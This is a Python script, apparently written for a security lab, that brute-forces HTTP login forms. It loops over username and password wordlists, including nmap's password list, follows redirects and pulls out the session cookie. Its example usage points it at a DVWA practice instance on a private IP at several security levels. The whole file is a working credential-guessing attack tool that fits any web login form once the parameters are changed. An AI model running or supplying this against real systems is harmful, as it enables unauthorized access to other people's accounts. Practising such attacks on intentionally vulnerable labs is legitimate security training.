import os, http.client, urllib.parse, requests

def brute_password(method, host, path, index, form_username, form_password, check, cookie):
    user_file = open('usernames.txt')
    pass_file = open('passwords.txt')
    user_list = user_file.readlines()
    pass_list = pass_file.readlines()
    url_path = path + index
    if cookie == "":
    	conn = http.client.HTTPConnection(host, 80)
    	conn.request("GET", url_path)
    	response = conn.getresponse()
    	cookie = response.getheader('Set-Cookie')
    	conn.close()
    for user in user_list:
        user = user.rstrip()
        for pwd in pass_list:
            pwd = pwd.rstrip()
            print(user, "-", pwd)
            post_params = urllib.parse.urlencode({form_username: user, form_password: pwd, 'Login':'Login', 'Server': 1})
            headers = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/html,application/xhtml+xml", "Cookie": cookie}
            if method == 'GET':
            	url_path = f"{url_path}?{post_params}"
            	post_params = ""
            conn = http.client.HTTPConnection(host, 80)
            conn.request(method, url_path, post_params, headers)
            response = conn.getresponse()
            if response.status in (301, 302, 303, 307, 308):
            	location = response.getheader('Location')
            	if location:
            		location = location.replace("http://", "").replace(host, "").replace(path, "")
            		url_path = path + location
            		conn.close()
            		conn = http.client.HTTPConnection(host, 80)
            		headers = {"Cookie": cookie}
            		conn.request('POST', url_path, post_params, headers)
            		response = conn.getresponse()
            body = response.read().decode('utf-8')
            conn.close()
            if body.find(check) == -1:
            	#print(body)
            	print("Logged in with:", user, "-", pwd)
            	user_file.close()
            	pass_file.close()
            	cookie_parts = cookie.split(",")
            	session_cookie = None
            	for part in cookie_parts:
            		if "sess" in part.lower():
            			session_cookie = part
            			break
            	return  session_cookie
            conn.close()
    user_file.close()
    pass_file.close()

def brute_requests(host, path, index, form_username, form_password, check):
    user_file = open('usernames.txt')
    pass_file = open('/usr/share/nmap/nselib/data/passwords.lst')
    user_list = user_file.readlines()
    pass_list = pass_file.readlines()
    url_path = f"http://{host}{path}{index}"
    print(url_path)
    for user in user_list:
        user = user.rstrip()
        for pwd in pass_list:
            pwd = pwd.rstrip()
            print(user, "-", pwd)
            headers = {"Content-type":"application/x-www-form-urlencoded", "Accept":"text/html,application/xhtml+xml"}
            post_params = urllib.parse.urlencode({form_username: user, form_password: pwd, 'server': 1})
            r = requests.post(url_path, post_params)
            if(r.text.find(check) == -1):
            	print("Logged in with:", user, "-", pwd)
    user_file.close()
    pass_file.close()

# Example usage:
hostname="192.168.50.101"

print("Login in /dvwa:")
cookie = brute_password("POST", hostname, "/dvwa/", "login.php", "username", "password", 'Damn Vulnerable Web App (DVWA) - Login', "")
print(f"Login in /dvwa/vulnerabilities/brute/ con cookie {cookie}; security=low")
brute_password("GET", hostname, "/dvwa/vulnerabilities/brute/", "index.php", "username", "password", 'Username and/or password incorrect', f"{cookie}; security=low")
print(f"Login in /dvwa/vulnerabilities/brute/ con cookie {cookie}; security=medium")
brute_password("GET", hostname, "/dvwa/vulnerabilities/brute/", "index.php", "username", "password", 'Username and/or password incorrect', f"{cookie}; security=medium")
print(f"Login in /dvwa/vulnerabilities/brute/ con cookie {cookie}; security=high")
brute_password("GET", hostname, "/dvwa/vulnerabilities/brute/", "index.php", "username", "password", 'Username and/or password incorrect', f"{cookie}; security=high")
print(cookie)
